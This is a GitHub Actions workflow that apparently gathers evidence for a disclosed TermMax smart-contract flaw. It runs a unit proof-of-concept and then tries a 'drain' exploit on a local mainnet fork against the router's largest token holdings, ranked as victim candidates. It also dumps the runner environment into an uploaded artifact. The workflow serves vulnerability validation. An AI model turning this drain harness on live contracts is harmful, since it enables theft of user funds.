name: termmax-tm-o1-full-gate

on:
  pull_request:
    types: [opened, synchronize, reopened]
    paths:
      - 'termmax-live-gate-trigger.txt'

permissions:
  contents: read

jobs:
  termmax-gate:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4

      - name: Install Foundry
        uses: foundry-rs/foundry-toolchain@v1
        with:
          version: stable

      - name: Record environment
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p evidence/live evidence/tests
          env | sort > evidence/RUNNER_ENV.txt
          forge --version > evidence/FOUNDRY_VERSION.txt
          cast --version >> evidence/FOUNDRY_VERSION.txt
          python3 --version > evidence/PYTHON_VERSION.txt 2>&1
          sha256sum scripts/termmax_live_gate_v2.py poc/TERMMAX_TM_O1_CI_POC.t.sol > evidence/INPUT_SHA256SUMS.txt

      - name: Run read-only Ethereum live gate
        id: live
        continue-on-error: true
        shell: bash
        run: |
          set +e
          OUT_DIR=evidence/live python3 scripts/termmax_live_gate_v2.py > evidence/live/EXECUTION.log 2>&1
          status=$?
          echo "$status" > evidence/live/EXIT_STATUS.txt
          cat evidence/live/EXECUTION.log
          exit 0

      - name: Clone pinned TermMax source and run exact unit PoC
        id: unit
        continue-on-error: true
        shell: bash
        run: |
          set +e
          git clone https://github.com/term-structure/termmax-contract-v2.git termmax > evidence/tests/CLONE.log 2>&1
          clone_status=$?
          echo "$clone_status" > evidence/tests/CLONE_EXIT_STATUS.txt
          if [ "$clone_status" -ne 0 ]; then cat evidence/tests/CLONE.log; exit 0; fi
          cd termmax
          git checkout e314f3f849577dfecd4614f148c4df81fdf8c72d >> ../evidence/tests/CLONE.log 2>&1
          git submodule update --init --recursive >> ../evidence/tests/CLONE.log 2>&1
          git rev-parse HEAD > ../evidence/tests/TERMMAX_GIT_HEAD.txt
          cp ../poc/TERMMAX_TM_O1_CI_POC.t.sol test/v2/TermMaxOkxArbitraryTargetDrainPoC.t.sol
          git diff -- test/v2/TermMaxOkxArbitraryTargetDrainPoC.t.sol > ../evidence/tests/POC_TEST_ONLY.diff
          forge test --use 0.8.30 --optimizer-runs 1 --via-ir \
            --match-contract TermMaxOkxArbitraryTargetDrainPoC \
            --match-test test_PoC_WhitelistedOkxAdapterDrainsUnrelatedRouterTokenViaForgedReturn \
            -vvvv > ../evidence/tests/TM_O1_UNIT.log 2>&1
          status=$?
          echo "$status" > ../evidence/tests/TM_O1_UNIT_EXIT_STATUS.txt
          cat ../evidence/tests/TM_O1_UNIT.log
          exit 0

      - name: Run deployed local-mainnet-fork exploit against positive holdings
        id: fork
        continue-on-error: true
        shell: bash
        run: |
          set +e
          if [ ! -f evidence/live/SUMMARY.json ] || [ ! -d termmax ]; then
            echo "live summary or source checkout missing" | tee evidence/tests/TM_O1_FORK_SKIPPED.txt
            exit 0
          fi
          python3 - <<'PY' > evidence/tests/VICTIM_CANDIDATES.tsv
          import json
          s=json.load(open('evidence/live/SUMMARY.json'))
          hs=s.get('positiveHoldings',[])
          def units(x):
              d=x.get('decimals')
              try: return int(x['balance'])/(10**int(d if d is not None else 18))
              except Exception: return 0
          for h in sorted(hs,key=units,reverse=True):
              print(h['token'], h.get('symbol') or '', h['balance'], h.get('decimals'), units(h), sep='\t')
          PY
          endpoint=$(python3 -c "import json;print(json.load(open('evidence/live/SUMMARY.json'))['endpoint'])")
          block=$(python3 -c "import json;print(json.load(open('evidence/live/SUMMARY.json'))['snapshotBlock'])")
          whitelisted=$(python3 -c "import json;print(str(json.load(open('evidence/live/SUMMARY.json')).get('adapterWhitelisted')).lower())")
          count=$(python3 -c "import json;print(json.load(open('evidence/live/SUMMARY.json')).get('positiveHoldingCount',0))")
          printf 'endpoint=%s\nblock=%s\nwhitelisted=%s\npositiveHoldingCount=%s\n' "$endpoint" "$block" "$whitelisted" "$count" > evidence/tests/FORK_INPUTS.txt
          if [ "$whitelisted" != "true" ] || [ "$count" -le 0 ]; then
            echo "no currently reachable positive-balance fork target" | tee evidence/tests/TM_O1_FORK_SKIPPED.txt
            exit 0
          fi
          cd termmax
          success=0
          index=0
          while IFS=$'\t' read -r token symbol raw decimals normalized; do
            [ -z "$token" ] && continue
            index=$((index+1))
            [ "$index" -gt 12 ] && break
            safe=$(echo "$token" | tr '[:upper:]' '[:lower:]' | tr -cd '0-9a-fx')
            MAINNET_RPC_URL="$endpoint" FORK_BLOCK="$block" VICTIM_TOKEN="$token" \
              forge test --use 0.8.30 --optimizer-runs 1 --via-ir \
              --match-contract TermMaxOkxLiveForkDrainPoC \
              --match-test test_PoC_LiveForkDrainCurrentRouterBalance \
              -vvvv > "../evidence/tests/TM_O1_FORK_${safe}.log" 2>&1
            status=$?
            printf '%s\t%s\t%s\t%s\t%s\n' "$token" "$symbol" "$raw" "$status" "$normalized" >> ../evidence/tests/FORK_RESULTS.tsv
            if [ "$status" -eq 0 ]; then
              echo "$token" > ../evidence/tests/FORK_SUCCESS_TOKEN.txt
              cp "../evidence/tests/TM_O1_FORK_${safe}.log" ../evidence/tests/TM_O1_FORK_SUCCESS.log
              success=1
              break
            fi
          done < ../evidence/tests/VICTIM_CANDIDATES.tsv
          echo "$success" > ../evidence/tests/TM_O1_FORK_SUCCESS_STATUS.txt
          [ -f ../evidence/tests/TM_O1_FORK_SUCCESS.log ] && cat ../evidence/tests/TM_O1_FORK_SUCCESS.log
          exit 0

      - name: Build evidence manifest
        if: always()
        shell: bash
        run: |
          set +e
          find evidence -type f -print0 | sort -z | xargs -0 sha256sum > evidence/SHA256SUMS.txt
          find evidence -type f -printf '%p\t%s bytes\n' | sort > evidence/FILE_LIST.txt
          python3 - <<'PY'
          import json, pathlib
          e=pathlib.Path('evidence')
          def text(path):
              p=e/path
              return p.read_text().strip() if p.exists() else None
          live={}
          if (e/'live/SUMMARY.json').exists():
              live=json.loads((e/'live/SUMMARY.json').read_text())
          verdict={
              'unitPoCExitStatus':text(pathlib.Path('tests/TM_O1_UNIT_EXIT_STATUS.txt')),
              'forkSuccessStatus':text(pathlib.Path('tests/TM_O1_FORK_SUCCESS_STATUS.txt')),
              'forkSuccessToken':text(pathlib.Path('tests/FORK_SUCCESS_TOKEN.txt')),
              'adapterWhitelisted':live.get('adapterWhitelisted'),
              'positiveHoldingCount':live.get('positiveHoldingCount'),
              'snapshotBlock':live.get('snapshotBlock'),
              'snapshotBlockHash':live.get('snapshotBlockHash'),
              'routerImplementation':(live.get('addresses') or {}).get('implementation'),
          }
          if verdict['unitPoCExitStatus']=='0' and verdict['forkSuccessStatus']=='1':
              verdict['gate']='MECHANIC_AND_LIVE_FORK_VALIDATED'
          elif verdict['unitPoCExitStatus']=='0':
              verdict['gate']='UNIT_MECHANIC_VALIDATED_LIVE_GATE_NOT_PASSED'
          else:
              verdict['gate']='NOT_VALIDATED'
          (e/'GATE_VERDICT.json').write_text(json.dumps(verdict,indent=2))
          print(json.dumps(verdict,indent=2))
          PY

      - name: Upload full evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: termmax-tm-o1-full-evidence
          path: evidence/
          if-no-files-found: error
          retention-days: 7
